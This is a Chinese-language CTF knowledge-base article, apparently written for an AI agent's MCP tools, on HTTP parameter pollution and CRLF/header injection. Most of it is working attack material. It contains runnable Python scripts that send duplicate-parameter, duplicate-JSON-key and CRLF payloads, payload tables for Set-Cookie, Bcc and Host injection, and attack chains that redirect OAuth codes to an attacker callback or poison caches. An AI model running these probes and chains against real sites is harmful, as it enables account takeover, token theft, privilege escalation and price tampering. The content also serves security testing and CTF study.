---
id: "ctf-website/03-injection/hpp-crlf"
title: "HPP / CRLF Injection / Header Injection"
title_en: "HPP, CRLF Injection, and Header Injection"
summary: >
  HPP/CRLF 的价值来自解析差异和头部边界差异：WAF、中间件、业务框架、代理、缓存、邮件网关可能读取不同的参数或 header。本篇给出 duplicate parameter 取值矩阵、JSON 重复键、分号/数组/编码差分、CRLF 响应头注入、Location/Set-Cookie/Cache/Email sink、可运行 oracle 和 Evidence 模板。
summary_en: >
  HPP/CRLF value comes from parser and header-boundary differences across WAFs, middleware, frameworks, proxies, caches, and mail gateways. Includes duplicate parameter matrices, duplicate JSON keys, semicolon/array/encoding differentials, CRLF response header injection, Location/Set-Cookie/Cache/Email sinks, runnable oracles, and evidence templates.
board: "ctf-website"
category: "03-injection"
signals: ["HPP", "参数污染", "CRLF", "换行注入", "响应拆分", "WAF bypass", "Header注入", "email注入", "duplicate parameter"]
mcp_tools: ["http_probe", "kb_router"]
keywords: ["HPP", "参数污染", "CRLF注入", "HTTP响应拆分", "换行注入", "WAF绕过", "header injection", "duplicate key"]
difficulty: "advanced"
tags: ["injection", "hpp", "crlf", "parser-differential", "ctf"]
language: "zh-CN"
last_updated: "2026-07-04"
related_articles: ["ctf-website/04-ssrf/ssrf", "ctf-website/08-infra/race-cache-smuggling", "ctf-website/20-oauth-deep/01-oauth-attack-chains"]
---

# HPP / CRLF Injection / Header Injection

HPP 是参数取值差异，CRLF 是头部边界差异。二者的共同点是：前置层、中间件、业务代码和下游服务看到的“同一个输入”不一定相同。

## 输入信号

| 信号 | 立即动作 | 命中样本 | 失败样本 |
|---|---|---|---|
| 同参数重复时响应变化 | first/last/array/join 取值矩阵 | `role=user&role=admin` 命中不同分支 | 框架固定取值且业务不受影响 |
| WAF/业务错误不一致 | benign first + payload second | WAF 放行，业务进入 payload 分支 | 两层都看同一值 |
| redirect/header 可控 | 注入 `%0d%0aX-Test:` | 响应头出现新增 header | header 编码或丢弃换行 |
| URL 被后端请求 | CRLF 改 Host/header/path | SSRF 下游请求差异 | URL parser 拒绝控制字符 |
| 邮件/邀请/反馈表单 | Subject/Bcc/Content-Type 头差分 | 邮件头/正文结构改变 | mailer 做 header encoding |
| JSON body 允许重复键 | `{"a":1,"a":2}` | WAF/业务取不同值 | JSON parser 同层处理 |

## 工作流

```text
建立 baseline 参数和 header
  → 构造 duplicate/query/json/form 取值矩阵
  → 对比 WAF/业务/下游响应差异
  → 对 Location/Set-Cookie/Cache/Email/SSRF sink 测 CRLF
  → 用响应头、回连、邮件、缓存或状态变化证明命中
```

## 0. HPP 取值矩阵

| 平台/解析器 | 常见行为 | 利用方向 |
|---|---|---|
| PHP | 最后一个 | WAF 看 first，业务用 last |
| Java Servlet | `getParameter` first，`getParameterValues` all | 中间件/业务分叉 |
| ASP.NET | 逗号 join | 拼接后绕过枚举 |
| Express `qs` | array/object | 类型混淆、PP 串联 |
| Flask/Werkzeug | first，`getlist` all | 业务取值点差异 |
| Go `net/http` | first，Values 保留 all | handler 自定义分叉 |

## 1. HPP oracle

```python
#!/usr/bin/env python3
import argparse
import hashlib
import json
import requests
from urllib.parse import urlencode

def digest(text):
    return hashlib.sha256(text.encode("utf-8", errors="ignore")).hexdigest()[:16]

def cases(param, a, b):
    return [
        ("first_second", [(param, a), (param, b)]),
        ("second_first", [(param, b), (param, a)]),
        ("array_suffix", [(param, a), (param + "[]", b)]),
        ("encoded_amp", [(param, a + "%26" + param + "=" + b)]),
        ("semicolon", f"{param}={a};{param}={b}"),
        ("comma_join", [(param, f"{a},{b}")]),
    ]

def hit(url, params):
    if isinstance(params, str):
        sep = "&" if "?" in url else "?"
        r = requests.get(url + sep + params, timeout=10)
    else:
        r = requests.get(url, params=params, timeout=10)
    return {"url": r.url, "status": r.status_code, "hash": digest(r.text), "location": r.headers.get("Location",""), "sample": r.text[:180]}

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--param", required=True)
    ap.add_argument("--normal", default="user")
    ap.add_argument("--payload", default="admin")
    args = ap.parse_args()
    for name, params in cases(args.param, args.normal, args.payload):
        print(json.dumps({"case": name, "result": hit(args.url, params)}, ensure_ascii=False))

if __name__ == "__main__":
    main()
```

成功样本：同一语义参数的顺序/数组/编码导致身份、价格、redirect、SQL/SSTI 过滤结果或响应 hash 稳定变化。失败样本：所有变体同一 hash，说明当前参数未被多层差异处理。

## 2. JSON duplicate key

```python
#!/usr/bin/env python3
import argparse
import hashlib
import json
import requests

def h(text):
    return hashlib.sha256(text.encode("utf-8", errors="ignore")).hexdigest()[:16]

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--cookie", default="")
    args = ap.parse_args()
    bodies = {
        "role_user_admin": '{"role":"user","role":"admin"}',
        "price_high_low": '{"price":1000,"price":1}',
        "redirect_safe_evil": '{"redirect_uri":"https://safe.example","redirect_uri":"https://attacker.example"}',
    }
    headers = {"Content-Type": "application/json"}
    if args.cookie:
        headers["Cookie"] = args.cookie
    for name, body in bodies.items():
        r = requests.post(args.url, data=body, headers=headers, timeout=10)
        print(json.dumps({"case": name, "status": r.status_code, "hash": h(r.text), "sample": r.text[:180]}, ensure_ascii=False))

if __name__ == "__main__":
    main()
```

## 3. CRLF sink 矩阵

| Sink | Payload | 命中样本 | 失败样本 |
|---|---|---|---|
| `Location` | `%0d%0aSet-Cookie: crlf=1` | 响应头新增 cookie/header | header value 被 encode |
| `Set-Cookie` | `%0d%0aX-Injected: 1` | 新 header 出现 | cookie parser 拒绝 |
| cache key/header | `%0d%0aCache-Control: public` | 缓存状态改变 | CDN 丢弃换行 |
| SSRF URL | `%0d%0aHost: internal` | 下游 listener 看到 header | URL parser reject |
| email subject/name | `x%0d%0aBcc: ...` | 邮件头结构变化 | mailer 编码头部 |

```python
#!/usr/bin/env python3
import argparse
import json
import requests

PAYLOADS = [
    "%0d%0aX-Injected: crlf_probe",
    "%0D%0ASet-Cookie:%20crlf_probe=1",
    "%0aX-Injected:%20lf_probe",
    "%0dX-Injected:%20cr_probe",
    "%250d%250aX-Injected:%2520double_encoded",
]

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True, help="Use {payload} placeholder")
    args = ap.parse_args()
    for p in PAYLOADS:
        url = args.url.replace("{payload}", p)
        r = requests.get(url, allow_redirects=False, timeout=10)
        interesting = {k: v for k, v in r.headers.items() if "Injected" in k or "Set-Cookie" in k or "Location" in k}
        print(json.dumps({"payload": p, "status": r.status_code, "headers": interesting, "body": r.text[:120]}, ensure_ascii=False))

if __name__ == "__main__":
    main()
```

## 4. 组合攻击链

```text
HPP redirect_uri
  → OAuth 中间件取 first，业务取 last
  → code/token 回到 attacker callback

HPP amount/role
  → WAF/校验层看 normal
  → 业务层取 payload
  → 订单、权限、flag 差异

CRLF Location
  → 响应头注入 Set-Cookie/Cache-Control
  → session fixation / cache poisoning / XSS 二跳

CRLF SSRF URL
  → 下游 Host/header/path 差异
  → 内网服务探测或协议拼接
```

## Evidence

| 项 | 记录内容 |
|---|---|
| 参数矩阵 | 参数名、顺序、编码、数组/分号/JSON 重复键 |
| 解析差异 | WAF/中间件/业务/下游响应状态、hash、错误文本 |
| Header sink | 可控 header、payload 编码层数、新增响应头 |
| 成功样本 | redirect、cookie、cache、订单、权限、OAuth code、flag 差异 |
| 失败样本 | 所有变体同 hash、换行被编码、pre-parser 拒绝控制字符 |
| 下一跳 | redirect 转 OAuth；cache 转 08-infra；SSRF 转 04-ssrf；金额转 payment |

## MCP 工具映射

| 步骤 | MCP 工具 | 说明 |
|---|---|---|
| 参数矩阵 | `http_probe` | 发送 duplicate/query/json/form 变体 |
| Header sink | `http_probe` | 固定 redirect/header 参数并比较响应头 |
| 知识路由 | `kb_router` | 按 HPP、CRLF、header injection、parser differential 搜索 |
